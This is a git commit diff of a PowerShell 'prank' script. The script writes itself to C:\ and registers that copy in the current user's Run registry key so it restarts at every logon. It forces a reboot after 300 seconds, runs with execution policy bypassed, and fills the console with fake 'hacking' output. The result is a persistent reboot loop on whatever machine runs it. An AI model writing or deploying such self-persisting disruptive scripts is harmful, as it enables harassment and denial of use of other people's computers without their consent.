f5bfbc25344a1674ef5792c27f534440f0aa043f
MD Jibon Howlader <73585915+ProgrammerJibon@users.noreply.github.com>
2025-04-20 12:41:23 +0600

    Update RestartPrank.ps1

--- RestartPrank.ps1
+++ RestartPrank.ps1
@@ -1,13 +1,17 @@
-$currentFile = $MyInvocation.MyCommand.Definition
-$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-New-ItemProperty -Path $runKey -Name "MyScript" -PropertyType String -Value $currentFile -Force
+$path = "C:\RestartPrank.ps1"
+$content = @"
+`$currentFile = `"$path`"
+`$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+New-ItemProperty -Path `$runKey -Name "MyScript" -PropertyType String -Value `$currentFile -Force
 shutdown /r /t 300
-
-while ($true) {
-    $host.UI.RawUI.WindowTitle = "hacking"
-    $line = ""
-    for ($i = 0; $i -lt 300; $i++) {
-        $line += Get-Random -Maximum 10
+while (`$true) {
+    `$host.UI.RawUI.WindowTitle = "hacking"
+    `$line = ""
+    for (`$i = 0; `$i -lt 300; `$i++) {
+        `$line += Get-Random -Maximum 10
     }
-    Write-Host $line -ForegroundColor Green
+    Write-Host `$line -ForegroundColor Green
 }
+"@
+Set-Content -Path $path -Value $content -Encoding UTF8
+Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`""
